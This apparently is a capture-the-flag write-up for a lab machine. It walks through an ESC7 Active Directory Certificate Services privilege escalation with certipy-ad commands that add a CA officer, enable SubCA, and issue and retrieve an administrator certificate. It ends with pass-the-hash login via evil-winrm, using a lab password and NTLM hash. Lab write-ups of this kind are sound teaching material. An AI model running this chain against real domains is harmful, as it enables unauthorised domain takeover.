# ESC7 Exploitation â€“ Commands, Options, and Detailed Explanations

This document merges the contents of **ESC7_Exploitation_Steps.md** and **ESC7_Exploitation_Detailed.md**, providing both **option descriptions** and **purpose explanations** for each executed command.

---

## 1ï¸âƒ£ Add Raven as CA Officer
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
```
### ğŸ”¹ Options:
- `ca` â†’ Interacts with the Certificate Authority.
- `-u raven@manager.htb` â†’ User for authentication.
- `-p 'R4v3nBe5tD3veloP3r!123'` â†’ Password for Raven.
- `-dc-ip 10.10.11.236` â†’ Domain Controller IP.
- `-ca manager-dc01-ca` â†’ Target CA name.
- `-add-officer raven` â†’ Adds Raven as CA officer.

### ğŸ”¹ Why Used?
This command grants Raven officer privileges on the CA, enabling high-level control like approving certificate requests or modifying CA configuration, which is essential for exploiting ESC7.

---

## 2ï¸âƒ£ Enable the SubCA Template
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
```
### ğŸ”¹ Options:
- `-enable-template subca` â†’ Enables the SubCA template.

### ğŸ”¹ Why Used?
The SubCA template allows requesting subordinate CA certificates, which can issue certs for any account. Enabling it prepares the environment for privilege escalation via administrator impersonation.

---

## 3ï¸âƒ£ List Enabled Templates
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
```
### ğŸ”¹ Options:
- `-list-templates` â†’ Displays enabled templates.

### ğŸ”¹ Why Used?
This confirms that the SubCA template is enabled and available for exploitation. Knowing available templates ensures selecting the most suitable one for privilege escalation.

---

## 4ï¸âƒ£ Request Administrator Certificate Using SubCA
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
```
### ğŸ”¹ Options:
- `req` â†’ Requests a certificate.
- `-template SubCA` â†’ Uses the SubCA template.
- `-upn administrator@manager.htb` â†’ Requests cert for Administrator UPN.

### ğŸ”¹ Why Used?
This command attempts to impersonate the Administrator by requesting a cert that authenticates as administrator@manager.htb, leveraging the SubCA templateâ€™s powerful capabilities.

---

## 5ï¸âƒ£ Issue the Pending Request (ID 22)
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 22
```
### ğŸ”¹ Options:
- `-issue-request 22` â†’ Approves request ID 22.

### ğŸ”¹ Why Used?
After submitting the certificate request, it remains pending. This command self-approves and issues the cert, abusing Ravenâ€™s ManageCA privileges to bypass administrative approval.

---

## 6ï¸âƒ£ Retrieve the Administrator Certificate
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 22
```
### ğŸ”¹ Options:
- `-retrieve 22` â†’ Retrieves issued cert with ID 22.

### ğŸ”¹ Why Used?
Downloads the issued administrator certificate as a PFX, which contains both the cert and its private key. This allows authentication without requiring a password or NT hash.

---

## 7ï¸âƒ£ Authenticate as Administrator
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
### ğŸ”¹ Options:
- `auth` â†’ Module for authentication using certificates.
- `-pfx administrator.pfx` â†’ Administratorâ€™s PFX file.
- `-dc-ip 10.10.11.236` â†’ Domain Controller IP.

### ğŸ”¹ Why Used?
Authenticates as Administrator using the PFX, extracting the NTLM hash and proving full control over the domain account.

---

## 8ï¸âƒ£ Final Domain Admin Access via Evil-WinRM
```
evil-winrm -u administrator -H 'ae5064c2f62317332c88629e025924ef' -i 10.10.11.236
```
### ğŸ”¹ Options:
- `-u administrator` â†’ Username.
- `-H` â†’ Use NTLM hash for login.
- `-i 10.10.11.236` â†’ Domain Controller IP.

### ğŸ”¹ Why Used?
Leverages the obtained NTLM hash to establish a remote PowerShell session as Administrator, achieving full domain compromise and retrieving the `root.txt` flag.
